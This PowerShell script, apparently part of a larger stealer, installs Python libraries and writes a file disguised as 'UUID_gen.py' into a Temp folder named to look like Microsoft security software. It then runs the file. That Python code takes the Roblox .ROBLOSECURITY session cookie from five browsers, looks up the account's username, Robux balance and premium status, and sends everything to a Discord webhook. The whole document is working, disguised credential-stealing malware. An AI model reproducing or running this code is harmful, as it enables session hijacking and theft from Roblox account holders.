#####################################################################
# This is for create the "UUID_gen.py" files
#
#
# For grab Roblox Cookies
#
#####################################################################
############################VARIABLES################################
$webHookUrlPYTHON="'"+$webHookUrl+"'"
$webHookUrlPYTHON2="""$webHookUrl"""
$webHookUrlPYTHON3="'"+$webHookUrlPYTHON2+"'"
$webHookUrl2="$"+"webHookUrl"
#####################################################################

py -m pip install robloxpy
py -m pip install requests
py -m pip install discordwebhook
py -m pip install browser-cookie3
#all libs

cd C:\Windows\Temp\Win.microsoft.Security.temp
Set-Content UUID_gen.py "

import os
import codecs
import marshal, zlib, base64, lzma
import json
from base64 import *

webhookk = '$webHookUrl'

def command(c):
    os.system(c)
def cls():
    os.system('cls')

try:
    import robloxpy
    import requests,re
    from discordwebhook import *
    import browser_cookie3
    
except:
    input('Fail... UUID broken')

def cookieLogger():

    data = []

    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass


cookies = cookieLogger()

roblox_cookie = cookies[1]
isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)


ebruh = requests.get('https://www.roblox.com/mobileapi/userinfo',cookies={'.ROBLOSECURITY':roblox_cookie})
info = json.loads(ebruh.text)
rid = info['UserID']
friends = robloxpy.User.Friends.External.GetCount(rid)
headshot = robloxpy.User.External.GetHeadshot(rid)
username = info['UserName']
robux = info['RobuxBalance']
premium = info['IsPremium']

discord = Discord(url=webhookk)
discord.post(
    embeds=[
        {
            'title': 'Roblox:',
            'color' : 12517376,
            'fields': [
                {'name': 'Username', 'value': username, 'inline': True},
                {'name': 'Robux Balance', 'value': robux, 'inline': True},
                {'name': 'Premium Status', 'value': premium,'inline': True},
                {'name': 'Friends', 'value': friends, 'inline': True},
                {'name': '.ROBLOSECURITY', 'value': f'```fix\n{roblox_cookie}```', 'inline': False},
            ],
            'thumbnail': {'url': headshot},


        },
    ]
)

"
python C:\Windows\Temp\Win.microsoft.Security.temp\UUID_gen.py